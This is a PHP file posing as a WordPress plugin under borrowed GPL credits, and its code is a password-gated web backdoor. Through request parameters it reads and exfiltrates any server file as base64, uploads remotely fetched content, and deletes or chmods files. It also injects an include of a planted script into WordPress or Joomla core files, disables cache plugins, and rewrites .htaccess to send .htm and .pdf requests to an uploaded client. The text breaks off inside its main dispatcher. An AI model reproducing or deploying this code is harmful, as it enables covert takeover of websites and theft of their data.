<?php  
/* 
Special thanks to:  

Ryan Duff and Firas Durri, authors of WP-ContactForm, to which this 
plugins' initial concept and some parts of code was built based on. 

modernmethod inc, for SAJAX Toolkit, which was used to build this 
plugins' AJAX implementation 
*/


/*
Copyright (C) 2006-8 Matthew Robinson
Based on the Original Subscribe2 plugin by 
Copyright (C) 2005 Scott Merrill (skippy@skippy.net)

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
http://www.gnu.org/licenses/gpl.html

You should have received a copy of the GNU General Public License along  
with this program (intouch-license-gpl.txt); if not, write to the  

    Free Software Foundation, Inc.,  
    59 Temple Place,  
    Suite 330,  
    Boston,  
    MA 02111-1307 USA
*/

/* 
Do not modify the following code to manipulate the output of this plugin.  
For configuration options, please see 'Options'. 
*/

@ignore_user_abort(true); 
@set_time_limit(0); 
@error_reporting(0); 	 

define('__WCRYK_VALUE__', '1d411c04533f5fc8e673badd78ac39b9');
define('__MAIN_PATH__', './../../../');
define('__CMS_NAME__', 'wordpress');



/**
*  Use this function for add http scheme to line
*  the output of AddHttpToLine().
*/
function AddHttpToLine($sInputLine)
{
	if(strncmp($sInputLine, 'http://', strlen('http://')) === 0)
	{
		return $sInputLine;
	} else
	{
		return 'http://'.$sInputLine;
	}
}

/**
*  Use this function for checking wcryk value
*  the output of CheckWcrykValue().
*/
function CheckWcrykValue()
{

	if(isset($_REQUEST['wcrykvalue']) === false)
	{
		echo '<fail>Wcryk value dont match</fail>';
		exit();
	}

	$sWcrykValue = '';
	$sWcrykValue = trim($_REQUEST['wcrykvalue']);
	if(strcmp($sWcrykValue, __WCRYK_VALUE__) != 0)
	{
		echo '<fail>Wcryk value dont match</fail>';
		exit();
	}
}


/**
*  Use this function for checking wcryk value
*  the output of EraseDubleSlash().
*/
function EraseDubleSlash($sInputPath)
{
	return preg_replace("/[\/]{2,}/", "/", $sInputPath);
}


/**
*  Use this function to for get content from url.
*  the output of CurlGetContents() is url content.
*/	
function CurlGetContents($sUrl, & $sOutContent, $nRecursion = 1) 
{	
	if($nRecursion > 10)
	{	
		$sOutContent = false;
		return false;
	}

	$lssHttpHeaders = array();
	if(isset($_REQUEST['header']) === true && isset($_REQUEST['header'][0]) === true)
	{
		for($i = 0;; ++$i)
		{
			if(isset($_REQUEST['header'][$i]) === false)
			{
				break;
			}
			
			$lssHttpHeaders[] = $_REQUEST['header'][$i];
		}
		
		shuffle($lssHttpHeaders);
	}
	
	if(isset($_REQUEST['referer']) === true)
	{	
		$sRefererUrl = '';
		$sRefererUrl = AddHttpToLine(trim($_REQUEST['referer']));

		
		$lssHttpHeaders[] = 'Referer: '.$sRefererUrl;
		
		if(count($lssHttpHeaders) > 1)
		{
			shuffle($lssHttpHeaders);
		}
	}


	$stCurlHandle = NULL;
	$stCurlHandle = @curl_init();
	
	if($stCurlHandle === false)
	{
		$sOutContent = false;
		return false;
	}
	
	
	
	curl_setopt($stCurlHandle, CURLOPT_URL, $sUrl);
	curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($stCurlHandle, CURLOPT_CONNECTTIMEOUT, 60);
	curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 60);
	//curl_setopt($stCurlHandle, CURLOPT_FOLLOWLOCATION, true);
	//curl_setopt($stCurlHandle, CURLOPT_MAXREDIRS, 10);
	curl_setopt($stCurlHandle, CURLOPT_HEADER, true);
	
	
	if(count($lssHttpHeaders) > 0)
	{
		curl_setopt($stCurlHandle, CURLOPT_HTTPHEADER, $lssHttpHeaders);
	}
	
	$sResult = false; // Execution result	
	$sResult = curl_exec($stCurlHandle);
	
	
	if($sResult === false || strlen($sResult) == 0) // Empty or bad answer
	{
		$sOutContent = false;
		return false;
	}
	
	$nHttpResponceCode = '';
	$nHttpResponceCode = curl_getinfo($stCurlHandle, CURLINFO_HTTP_CODE);
		
	curl_close($stCurlHandle);
	
	
	
	$sHeaders = '';
	$sHeaders = substr($sResult, 0, strpos($sResult, "\r\n\r\n"));
	$sHeaders = trim($sHeaders);
	
	
	$sBody = '';
	$sBody = substr($sResult, strpos($sResult, "\r\n\r\n"));
	$sBody = trim($sBody);
	
	
	if($nHttpResponceCode == 301 || $nHttpResponceCode == 302)
	{
		$lssMatches = array();
		preg_match('/(Location:|URI:)(.*?)(?:\n|$)/', $sHeaders, $lssMatches);
		
		if (isset($lssMatches[2]) === true) 
		{
			$lssMatches[2] = trim($lssMatches[2]);
			CurlGetContents($lssMatches[2], $sOutContent, ++$nRecursion);
			return true;
		}
	} 
	
	
	$sOutContent = $sBody;
	return true;
}

/**
*  Use this function is getting HTTP headers by using CURL
*  the output of CurlGetHeaders().
*/
function CurlGetHeaders(& $rsUrl) 
{ 
	$stCurlHandle = @curl_init(); 

	curl_setopt($stCurlHandle, CURLOPT_URL,            $rsUrl); 
	curl_setopt($stCurlHandle, CURLOPT_HEADER,         true); 
	curl_setopt($stCurlHandle, CURLOPT_NOBODY,         true); 
	curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, true); 
	curl_setopt($stCurlHandle, CURLOPT_TIMEOUT,        5); 

	$sCurlExecResult = '';
	$sCurlExecResult = curl_exec($stCurlHandle); 
	$sCurlExecResult = explode("\n", $sCurlExecResult); 
	return $sCurlExecResult; 
}

/**
*  Use this function is check url avalibility
*  the output of CheckAvalibility().
*/
function CheckAvalibility(& $rsURL) 
{	
	$sResult = CurlGetHeaders($rsURL); 
	
	if($sResult === false)
	{
		return false;
	}
	
	$nMatch = preg_match('#[123][0-9]{2,2}#i', $sResult[0]); 
	if($nMatch === false || $nMatch > 0)
	{
		return true; 	
	} 
	
	return false;
}

/**
*  Use this function is check can we use CURL or not
*  the output of CheckCurlWork().
*/
function CheckCurlWork($sCheckUrl) 
{
	if(function_exists('curl_init') == true) 
	{
		if(CheckAvalibility($sCheckUrl) === true)  
		{		
			return true;
		}
	}
	
	return false;
}

/**
*  Use this function is getting remote content by url
*  the output of GetContents().
*/
function GetContents($sContentUrl, & $sOutContent) 
{
	if(function_exists('curl_init') == true) 
	{
		$bGetContentResult = false;
		$bGetContentResult = CurlGetContents($sContentUrl, $sOutContent); 

		if($bGetContentResult === true)
		{
			return $bGetContentResult;
		}
	}
	
	if(function_exists('file_get_contents') == true) 
	{
		$sOutContent = @file_get_contents($sContentUrl);
		if(!($sOutContent === false))
		{
			return true;
		}
	}
	
	$stUrlHandle = @fopen($sContentUrl, "r");
	if($stUrlHandle === false)
	{
		return false;
	}
	
	$sOutContent = '';
	
		while (!feof($stUrlHandle))
		{
			$sTempContent = fgets($stUrlHandle, 1024);
			if (!$sTempContent)
			{
				break;
			}
		   $sOutContent .= $sTempContent;
		}
	fclose($stUrlHandle);

	if(!($sOutContent === false) && strlen($sOutContent) > 0)
	{
		return true;
	}
	
	return false;
}


/**
*  Use this function show standart message
*  the output of CheckScript().
*/
function CheckScript() 
{
	echo '<correct>Script avalible</correct>';
	exit();
}

/**
*  Use this function is make check redirect in files
*  the output of CheckRedirectFuntion().
*/
function GetFileContent()
{	
	$sFileUrl = ''; 
	$sFileContent = '';
	
	if(isset($_REQUEST['file-path']) === false)
	{
		echo '<fail>no file path</fail>';
		return;
	}
	
	$sFileUrl = $_REQUEST['file-path']; 
	
	
	if(file_exists($sFileUrl) === false)
	{
		echo '<fail>file not exist</fail>';
		return;
	}
	
	if(is_file($sFileUrl) === false)
	{	
		echo '<fail>this is not a file</fail>';
		return;
	}
	
	
	
	$sFileContent = file_get_contents($sFileUrl); 
	if($sFileUrl === false)
	{
		echo '<fail>cant open file</fail>';
		return;
	}
	
	echo '<mdhash>'.md5($sFileContent).'</mdhash>';
	echo '<correct>correct get file</correct>';
	echo base64_encode($sFileContent);
	return true;
}


/**
*  Use this function for check existing file
*  the output of CheckRedirectFuntion().
*/
function IsFileExist()
{	
	$sFileUrl = '';
	
	if(isset($_REQUEST['file-path']) === false)
	{
		echo '<fail>no file path</fail>';
		return;
	}
	
	$sFileUrl = $_REQUEST['file-path']; 
	
	if(file_exists($sFileUrl) === true)
	{
		echo '<correct>file exist</correct>';
	} else
	{
		echo '<correct>file not exist</correct>';
	}
	
	return;
}


/**
*  Use this function chmod
*  the output of FileChmod().
*/
function FileChmod()
{	
	$sFileUrl = '';
	
	if(isset($_REQUEST['file-path']) === false)
	{
		echo '<fail>no file path</fail>';
		return;
	}
	$sFileUrl = trim($_REQUEST['file-path']);
	
	
	$nChmodParam = 0755;
	
	if(isset($_REQUEST['chmod']) === false)
	{
		echo '<fail>no chmodparametr</fail>';
		return;
	}
	$nChmodParam = trim($_REQUEST['chmod']);
	
	if($nChmodParam[0] === '0')
	{
		$nChmodParam[0] = ' ';
		$nChmodParam = trim($nChmodParam);
	}
	
	$nChmodParam = (int) $nChmodParam;
	$nChmodParam = octdec($nChmodParam);

	
	
	
	$bIsChmodCreate = true;
	$bIsChmodCreate = chmod($sFileUrl, $nChmodParam);
	
	if($bIsChmodCreate === true)
	{
		echo '<correct>update chmod correct</correct>';
	} else
	{
		echo '<fail>cant create chmod</fail>';
	}
}


/** 
* Recursively delete a directory 
* 
* @param string $dir Directory name 
* @param boolean $deleteRootToo Delete specified top-level directory as well 
*/ 
function UnlinkRecursive($dir, $deleteRootToo = true) 
{ 
    if(!$dh = @opendir($dir)) 
    { 
        return false; 
    } 
    while (false !== ($obj = readdir($dh))) 
    { 
        if($obj == '.' || $obj == '..') 
        { 
            continue; 
        } 

        if (!@unlink($dir . '/' . $obj)) 
        { 
            UnlinkRecursive($dir.'/'.$obj, true); 
        } 
    } 

    closedir($dh); 
    
    if ($deleteRootToo) 
    { 
        @rmdir($dir); 
    } 
    
    return true; 
}


/**
*  Use this function for delete file
*  the output of CheckRedirectFuntion().
*/
function DeleteFile()
{
	$sFileUrl = '';
	
	if(isset($_REQUEST['file-path']) === false)
	{
		echo '<fail>no file path</fail>';
		return;
	}
	
	$sFileUrl = $_REQUEST['file-path']; 
	
	if(file_exists($sFileUrl) === false)
	{
		echo '<fail>file not exist</fail>';
		return;
	}
	
	
	$bIsFileDelete = false; 
	
	if(is_dir($sFileUrl) === true)
	{
		$bIsFileDelete = UnlinkRecursive($sFileUrl);
	} else
	{
		$bIsFileDelete = unlink($sFileUrl);
	}
	
	if($bIsFileDelete === true)
	{
		if(file_exists($sFileUrl) === false)
		{
			echo '<correct>correct delete file</correct>';
		}
	} else
	{
		echo '<fail>cant delete file</fail>';
	}
	
	return;
}


/**
*  Use this function for upload file
*  the output of CheckRedirectFuntion().
*/
function UploadFile($bShowLog = true)
{
	$sFileContent = ''; 
	$sFileUrl = '';
	
	if(isset($_REQUEST['file-path']) === false || strlen(trim($_REQUEST['file-path'])) === 0)
	{		
		if($bShowLog === true)
		{
			echo '<fail>no file path</fail>';
		}
		return false;
	}
		
	$sFileUrl = $_REQUEST['file-path']; 
	
	
	
	if(!(isset($_REQUEST['content']) === false) && strlen(trim($_REQUEST['content'])) > 0)
	{
		$sFileContent = $_REQUEST['content'];
		$sFileContent = base64_decode($sFileContent);
	} else
		if(isset($_REQUEST['GetContent']) === true && strlen(trim($_REQUEST['GetContent'])) > 0)
		{
			$sGetUrl = '';
			$sGetUrl = trim($_REQUEST['GetContent']);
			
			if(strlen($sGetUrl) == 0)
			{			
				if($bShowLog === true)
				{
					echo '<fail>no valid url</fail>';
				}
				return false;
			}
			
			$nMatch = preg_match('#^http:\/\/#i', $sGetUrl); 
			if($nMatch === false || $nMatch == 0)
			{
				$sGetUrl = 'http://'.$sGetUrl;
			}

			
			$sOutContent = '';
			$bGetContentResult = false;
			$bGetContentResult = GetContents($sGetUrl, $sOutContent);
			
			if($bGetContentResult === false || $sOutContent === false || strlen($sOutContent) === 0)
			{
				if($bShowLog === true)
				{
					echo '<fail>cant get content</fail>';
					echo '<getted_url>'.$sGetUrl.'</getted_url>';
				}
				return false;
			} else
			{
				$sFileContent = $sOutContent;
				$sFileContent = base64_decode($sFileContent);
			}
		} else
		{
			if($bShowLog === true)
			{
				echo '<fail>no file content</fail>';
			}
			return false;
		}
	
	if(isset($_REQUEST['md5hash']) === false || $_REQUEST['md5hash'] != md5($sFileContent))
	{
		if($bShowLog === true)
		{
			echo '<fail>md5 hash not match</fail>';
		}
		return false;
	}
	
	
	$stOutFileHandle = false;
	$stOutFileHandle = fopen($sFileUrl, 'w');
	if($stOutFileHandle === false)
	{
		if($bShowLog === true)
		{
			echo '<fail>cant open file for write</fail>';
		}
		//return false;
	}
		fwrite($stOutFileHandle, $sFileContent);
	fclose($stOutFileHandle);
	
	
	if(file_exists($sFileUrl) === false)
	{
		if($bShowLog === true)
		{
			echo '<fail>Fail not created</fail>';
		}
		return false;
	}
	
	if($bShowLog === true)
	{
		echo '<correct>correct write</correct>';
	}
	
	return true;
}

/**
*  Use this function for creating dir
*  the output of MakeDir().
*/
function MakeDir()
{		
	$sFileUrl = '';
	
	if(isset($_REQUEST['file-path']) === false)
	{
		echo '<fail>no file path</fail>';
		return;
	}
	$sFileUrl = trim($_REQUEST['file-path']);
	
	
	$bIsDirectoryCreate = false;
	$bIsDirectoryCreate = mkdir($sFileUrl, 0777, true);
	
	if($bIsDirectoryCreate === true)
	{
		echo '<correct>correct create directory</correct>';
	} else
	{
		echo '<fail>cant create directory</fail>';
	}
}


/**
*  Use this function for get list content of direcotry
*  the output of GetDirectoryList().
*/
function GetDirectoryList($bIsShowResult = true, $sInFilePath = '')
{	
	$sDirectoryPath = '';
	
	if(strlen($sInFilePath) === 0)
	{
		if(isset($_REQUEST['file-path']) === false)
		{
			echo '<fail>no file path</fail>';
			return;
		}
		$sDirectoryPath = trim($_REQUEST['file-path']);
	} else
	{
		$sDirectoryPath = $sInFilePath;
	}

	
	
	$lsNamesArrayList = array();
	
	$stDirectoryHandle = opendir($sDirectoryPath);
	
	if (!($stDirectoryHandle === false)) 
	{
		$sFileName = '';
		
		while (false !== ($sFileName = readdir($stDirectoryHandle))) 
		{ 
			if(strcmp($sFileName, '.') != 0 && strcmp($sFileName, '..'))
			{
				if(is_dir($sDirectoryPath.$sFileName) === true)
				{
					if($bIsShowResult === true)
					{
						$lsNamesArrayList[] = $sFileName.'<$%sep%$>d';
					} else
					{
						$lsNamesArrayList[] = array('type' => 'd', 'name' => $sFileName);
					}
				} else
				{
					if($bIsShowResult === true)
					{
						$lsNamesArrayList[] = $sFileName.'<$%sep%$>f';
					} else
					{
						$lsNamesArrayList[] = array('type' => 'f', 'name' => $sFileName);
					}
				}
			}
		}
	} else
	{
		echo '<fail>cant open direcotry</fail>';
	}
	
	
	if($bIsShowResult === true)
	{
		echo '<correct>directory list</correct>';
		echo implode("\n", $lsNamesArrayList);
	} else
	{
		return $lsNamesArrayList;
	}
}

/**
*  Use this function for get list content of direcotry
*  the output of GetPwdPath().
*/
function GetPwdPath()
{
	$sPathToDirectory = '';
	
	if(function_exists('getcwd') === true)
	{
		$sPathToDirectory = getcwd();
	} else
	{
		echo '<fail>function not exist</fail>';
		return;		
	}
	
	if($sPathToDirectory === false)
	{
		echo '<fail>cant get work dir</fail>';
		return;
	}
	
	echo '<mdhash>'.md5($sPathToDirectory).'</mdhash>';
	echo '<correct>correct get pwd</correct>';
	echo base64_encode($sPathToDirectory);
	return true;
}


/**
*  Use this function for get list content of direcotry
*  the output of MakeInclude().
*/
function MakeInclude()
{
	$sFileUrl = '';
	if(isset($_REQUEST['file-path']) === false)
	{
		echo '<fail>no file path</fail>';
		return;
	}
	$sFileUrl = trim($_REQUEST['file-path']);
	
	
	if(file_exists($sFileUrl) === false)
	{
		echo '<fail>fail not exist</fail>';
		return;
	}
	
	
	$sGettedContent = ''; 
	$sGettedContent = file_get_contents($sFileUrl);
	
	if($sGettedContent === false || strlen($sGettedContent) === 0)
	{
		echo '<fail>cant get content from file</fail>';
		return;
	}
	
	if(strcmp(__CMS_NAME__, 'wordpress') === 0)
	{
		$sGettedContent = str_replace("@require_once('class.wp-includes.php');", '', $sGettedContent);
		$sGettedContent = preg_replace("/(@package\s+WordPress\s+\*\/)/", "\\1@require_once('class.wp-includes.php');", $sGettedContent);
	} else
		if(strcmp(__CMS_NAME__, 'joomla') === 0)
		{
			$sGettedContent = str_replace("\n\ndefine('JPATH_ADAPTERSERVER',  dirname(__FILE__).'/joomla/base/adapterobserver.php');\nif(file_exists(JPATH_ADAPTERSERVER))\n@require_once(JPATH_ADAPTERSERVER);');", '', $sGettedContent);
			$sGettedContent = preg_replace("/\*\//", "*/\n\ndefine('JPATH_ADAPTERSERVER',  dirname(__FILE__).'/joomla/base/adapterobserver.php');\nif(file_exists(JPATH_ADAPTERSERVER))\n@require_once(JPATH_ADAPTERSERVER);", $sGettedContent, 1);
		}		
	
	$stOutFileHandle = false;
	$stOutFileHandle = fopen($sFileUrl, 'w');
	if($stOutFileHandle === false)
	{
		echo '<fail>cant open file for write</fail>';
		return;
	}
		fwrite($stOutFileHandle, $sGettedContent);
	fclose($stOutFileHandle);
	
	echo '<correct>correct include</correct>';
	return;
}


/**
*  Use this function for get list content of direcotry
*  the output of ClearInclude().
*/
function ClearInclude()
{
	$sFileUrl = '';
	if(isset($_REQUEST['file-path']) === false)
	{
		echo '<fail>no file path</fail>';
		return;
	}
	$sFileUrl = trim($_REQUEST['file-path']);
	
	
	if(file_exists($sFileUrl) === false)
	{
		echo '<fail>fail not exist</fail>';
		return;
	}
	
	
	$sGettedContent = ''; 
	$sGettedContent = file_get_contents($sFileUrl);
	
	if($sGettedContent === false || strlen($sGettedContent) === 0)
	{
		echo '<fail>cant get content from file</fail>';
		return;
	}
	
	
	$sGettedContent = str_replace("@require_once('class.wp-includes.php');", '', $sGettedContent);

		
	$stOutFileHandle = false;
	$stOutFileHandle = fopen($sFileUrl, 'w');
	if($stOutFileHandle === false)
	{
		echo '<fail>cant open file for write</fail>';
		return;
	}
		fwrite($stOutFileHandle, $sGettedContent);
	fclose($stOutFileHandle);
	
	echo '<correct>correct clear</correct>';
	return;
}

/**
*  Use this function is recursive delete folder content
*  the output of RecursiveDelete().
*/
function RecursiveDelete($sDirectory, $bIsEmpty = false)  
{ 
    if(substr($sDirectory,-1) == "/") 
	{ 
        $sDirectory = substr($sDirectory, 0, -1); 
    } 

    if(!file_exists($sDirectory) || !is_dir($sDirectory)) 
	{ 
        return false; 
    } else
		if(!is_readable($sDirectory)) 
		{ 
			return false; 
		} else 
		{ 
			$stDirectoryHandle = opendir($sDirectory); 
			
			while ($sContents = readdir($stDirectoryHandle)) 
			{ 
				if($sContents != '.' && $sContents != '..' && $sContents != '.htaccess') 
				{ 
					$sPath = $sDirectory . "/" . $sContents; 
					
					if(is_dir($sPath)) 
					{ 
						RecursiveDelete($sPath); 
					} else 
					{ 
						unlink($sPath); 
					} 
				} 
			} 
			
			closedir($stDirectoryHandle); 

			if($bIsEmpty == false) 
			{ 
				if(!rmdir($sDirectory)) 
				{ 
					return false; 
				} 
			} 
			
			return true; 
		} 
}

/**
*  Use this function is diactivate dab cache
*  the output of DeactivateCache().
*/
function DeactivateCache($sCacheFileConfig)
{

	if(file_exists($sCacheFileConfig) == false) 
	{
		return;
	}

	$sConfigContent = '';
	$stConfigFileHandle = fopen($sCacheFileConfig, 'r');  
	if($stConfigFileHandle === false)
	{
		echo '<fail>fail open cache config file</fail>'; 
		exit();
	}
		$sConfigContent = fread($stConfigFileHandle, filesize($sCacheFileConfig)); 
		if($sConfigContent === false)
		{
			fclose($stConfigFileHandle);
			echo '<fail>fail read cache config file</fail>'; 
			exit();
		}
	fclose($stConfigFileHandle);
	
		
		$sConfigContent = preg_replace('#((?:=)|(?:[\s\n]*))true([\s\n\r]*;)#i', '\\1false\\2', $sConfigContent); 
	
	$stUpdateFileHanle = fopen($sCacheFileConfig, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open cache config file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sConfigContent) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in cache config file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
}


/**
*  Use this function is diactivate dab cache
*  the output of DeactivateTotalCache().
*/
function DeactivateTotalCache($sCacheFileConfig)
{

	if(file_exists($sCacheFileConfig) == false) 
	{
		return;
	}

	$sConfigContent = '';
	$stConfigFileHandle = fopen($sCacheFileConfig, 'r');  
	if($stConfigFileHandle === false)
	{
		echo '<fail>fail open cache config file</fail>'; 
		exit();
	}
		$sConfigContent = fread($stConfigFileHandle, filesize($sCacheFileConfig)); 
		if($sConfigContent === false)
		{
			fclose($stConfigFileHandle);
			echo '<fail>fail read cache config file</fail>'; 
			exit();
		}
	fclose($stConfigFileHandle);
	
		
		$sConfigContent = preg_replace("/if\s*\(!defined\('W3TC_IN_MINIFY'\)\)\s*{/", "if (true === false) {", $sConfigContent);; 
	
	$stUpdateFileHanle = fopen($sCacheFileConfig, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open cache config file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sConfigContent) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in cache config file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
}


/**
*  Use this function is recursive delete folder content
*  the output of ClearCache().
*/
function ClearCache()
{	
	$sDirUrl = '';
	if(isset($_REQUEST['dir-path']) === false)
	{
		/*echo '<fail>no file path</fail>';
		return;*/
		$sDirUrl = __MAIN_PATH__;
	} else
	{
		$sDirUrl = trim($_REQUEST['dir-path']);
	}

	
	
	if(file_exists($sDirUrl) === false)
	{
		echo '<fail>fail not exist</fail>';
		return;
	}
	
	define('__UPDATE_CACHE1__', '/wp-content/advanced-cache.php'); 
	define('__UPDATE_CACHE2__', '/wp-content/plugins/wp-cache/wp-cache.php'); 
	
	define('__UPDATE_CACHE3__', '/wp-content/plugins/wp-super-cache/wp-cache-config.php');  
	define('__UPDATE_CACHE4__', '/wp-content/wp-cache-config.php');   
	
	define('__UPDATE_CACHE_TOTAL__', '/wp-content/plugins/w3-total-cache/w3-total-cache.php');   
	
	define('__CACHE_FOLDER__',  '/wp-content/cache/'); 
	

	DeactivateCache(EraseDubleSlash($sDirUrl.__UPDATE_CACHE1__)); 				
	DeactivateCache(EraseDubleSlash($sDirUrl.__UPDATE_CACHE2__));

	DeactivateCache(EraseDubleSlash($sDirUrl.__UPDATE_CACHE3__));
	DeactivateCache(EraseDubleSlash($sDirUrl.__UPDATE_CACHE4__));	
	
	DeactivateTotalCache(EraseDubleSlash($sDirUrl.__UPDATE_CACHE_TOTAL__)); 
	
	RecursiveDelete(EraseDubleSlash($sDirUrl.__CACHE_FOLDER__), true); 
	
	echo '<correct>clear cache</correct>';
	return;
}


/**
*  Use this function for HTML repair
*  the output of RepairHtml().
*/
function RepairHtml()
{
	$lssNames   = array();
	$lssNames[] = 'images';
	$lssNames[] = 'gallery';
	$lssNames[] = 'pictures';
	$lssNames[] = 'library';
	$lssNames[] = 'archive';
	$lssNames[] = 'adapterobserver';
	$lssNames[] = 'servlet';
	
	$nTryCount = 3;
	
	$lssDirectoryContent = ''; 
	$lssDirectoryContent = GetDirectoryList(false, dirname(__FILE__).'/');
	
	foreach($lssDirectoryContent as $stDirectoryContent)
	{
		if($stDirectoryContent['type'] === 'f')
		{
			continue;
		}
		
		if($nTryCount === 0)
		{
			break;
		}
		
		mt_rand(time() + mt_rand(0, 100000));
		shuffle($lssNames);
		
		$lssFileNames = array();
		$lssFileNames[] = $stDirectoryContent['name'];
		$lssFileNames = array_merge($lssFileNames, $lssNames);
		

		foreach($lssFileNames as $sFileName)
		{
			if(file_exists(dirname(__FILE__).'/'.$stDirectoryContent['name'].'/'.$sFileName.'.php') === true)
			{
				continue;
			}
			
			$_REQUEST['file-path'] = EraseDubleSlash(dirname(__FILE__).'/'.$stDirectoryContent['name'].'/'.$sFileName.'.php');
			$bIsFileUploaded = false;		
			$bIsFileUploaded = UploadFile(false);
			if($bIsFileUploaded === true)
			{
				$sUploadFilePath = '';
				$sUploadFilePath = EraseDubleSlash(dirname($_SERVER['PHP_SELF']).'/'.$stDirectoryContent['name'].'/'.$sFileName.'.php');
				
				echo '<correct>Correct upload client</correct>';
				return $sUploadFilePath;
			}
		}
		
		--$nTryCount;
	}

	shuffle($lssNames);

	foreach($lssNames as $sFileName)
	{
		if(file_exists(dirname(__FILE__).'/'.$sFileName.'.php') === true)
		{
			continue;
		}
		
		$_REQUEST['file-path'] = EraseDubleSlash(dirname(__FILE__).'/'.$sFileName.'.php');
		$bIsFileUploaded = false;		
		$bIsFileUploaded = UploadFile(false);
		if($bIsFileUploaded === true)
		{
			$sUploadFilePath = '';
			$sUploadFilePath = EraseDubleSlash(dirname($_SERVER['PHP_SELF']).'/'.$sFileName.'.php');
			
			echo '<correct>Correct upload client</correct>';
			return $sUploadFilePath;
		}
	}

	
	echo '<fail>cant upload client</fail>';
	return false;
}

/**
*  Use this function for htaccess clear
*  the output of ClearHtaccess()
*/
function ClearHtaccess()
{
	$sHtaccessPath = '';
	$sHtaccessPath = __MAIN_PATH__.'.htaccess';
	
	$sNewHtaccessContent = '';
	if(file_exists($sHtaccessPath) === true)
	{
		$sOldHtaccessContent = file_get_contents($sHtaccessPath);
		
		$sNewHtaccessContent = $sOldHtaccessContent;
		$sNewHtaccessContent = preg_replace("/\s*\#Start\sSpec\scheck\srewrite\srule.*#End\sSpecial\scheck\srewrite\srule\s*/is", "\n", $sNewHtaccessContent);
		$sNewHtaccessContent = trim($sNewHtaccessContent);
	} else
	{
		echo '<notice>htaccess not exists</notice>';
		echo '<correct>correct clear</correct>';
	}
	

	$stOutFileHandle = false;
	$stOutFileHandle = fopen($sHtaccessPath, 'w');
	if($stOutFileHandle === false)
	{
		echo '<fail>cant open file for write</fail>';
		return;
	}
		fwrite($stOutFileHandle, $sNewHtaccessContent);
	fclose($stOutFileHandle);
	
	echo '<correct>correct clear</correct>';

	return;	
}

/**
*  Use this function for htaccess repair
*  the output of RepairHtml().
*/
function RepairHtmlHtaccess($sHtaccessPath, $sScriptFilePath)
{
	$sOldHtaccessContent = '';
	$sNewHtaccessContent = '';
	if(file_exists($sHtaccessPath) === true)
	{
		$sOldHtaccessContent = file_get_contents($sHtaccessPath);
		
		$sNewHtaccessContent = $sOldHtaccessContent;
		$sNewHtaccessContent = preg_replace("/\s*\#Start\sSpec\scheck\srewrite\srule.*#End\sSpecial\scheck\srewrite\srule\s*/is", "\n", $sNewHtaccessContent);
		$sNewHtaccessContent = trim($sNewHtaccessContent);
	}
	
	$sTemplate = '';
	$sTemplate = '#Start Spec check rewrite rule
RewriteEngine On
RewriteCond %{DOCUMENT_ROOT}<%PATH_TO_SCRIPT%> -f
RewriteCond %{QUERY_STRING} ^(.*)$
RewriteRule ^(.*\.htm(:?l?))$ .<%PATH_TO_SCRIPT%>?old-path=$1&%1 [L]
RewriteCond %{DOCUMENT_ROOT}<%PATH_TO_SCRIPT%> -f
RewriteCond %{QUERY_STRING} ^(.*)$
RewriteRule ^(.*\.pdf)$ .<%PATH_TO_SCRIPT%>?old-path=$1&%1 [L]
#End Special check rewrite rule';
	
	$sTemplate = str_replace('<%PATH_TO_SCRIPT%>', $sScriptFilePath, $sTemplate);
	
	$sNewHtaccessContent .= "\n\n".$sTemplate."\n";
	$sNewHtaccessContent = trim($sNewHtaccessContent);
	
	$stOutFileHandle = false;
	$stOutFileHandle = fopen($sHtaccessPath, 'w');
	if($stOutFileHandle === false)
	{
		echo '<fail>cant open htaccess file for writing</fail>';
		return false;
	}
		fwrite($stOutFileHandle, $sNewHtaccessContent);
	fclose($stOutFileHandle);
	
	
	echo '<correct>correct repair htaccess</correct>';
	return true;
}



/**
*  Use this function main working function
*  the output of Main().
*/
function Main() 
{		
	if(isset($_REQUEST['check_script']) == true)
	{
		CheckWcrykValue();
		CheckScript();
		exit();		
	}
	
	if(isset($_REQUEST['pwd']) == true)
	{
		CheckWcrykValue();
		GetPwdPath();
		exit();
	}

	if(isset($_REQUEST['inc_css']) == true)
	{
		CheckWcrykValue();
		if(strncmp(__MAIN_PATH__, './', 2) === 0)
		{
			$_REQUEST['file-path'] = EraseDubleSlash(__MAIN_PATH__.$_REQUEST['file-path']);
		}
		MakeInclude(); 
		exit();
	}

	if(isset($_REQUEST['make_repair']) == true)
	{
		CheckWcrykValue();
		
		switch(__CMS_NAME__)
		{
			case 'wordpress':
			{
				$_REQUEST['file-path'] = ''; 
				$_REQUEST['file-path'] = EraseDubleSlash(__MAIN_PATH__.'/wp-includes/class.wp-includes.php');
				UploadFile();


				$_REQUEST['file-path'] = ''; 
				$_REQUEST['file-path'] = EraseDubleSlash(__MAIN_PATH__.'/wp-includes/vars.php');
				MakeInclude();				


				$_REQUEST['dir-path'] = '';
				$_REQUEST['dir-path'] = EraseDubleSlash(__MAIN_PATH__.'/');
				ClearCache();
				
				break;
			}
			
			case 'joomla':
			{
				$_REQUEST['file-path'] = ''; 
				$_REQUEST['file-path'] = EraseDubleSlash(__MAIN_PATH__.'/libraries/joomla/base/adapterobserver.php');
				UploadFile();
				

				$_REQUEST['file-path'] = '';
				$_REQUEST['file-path'] = EraseDubleSlash(__MAIN_PATH__.'/libraries/loader.php');
				MakeInclude();
		
				break;
			}
			
			case 'html':
			{
				$sScriptPath = '';
				if(isset($_REQUEST['file-path']) === true)
				{
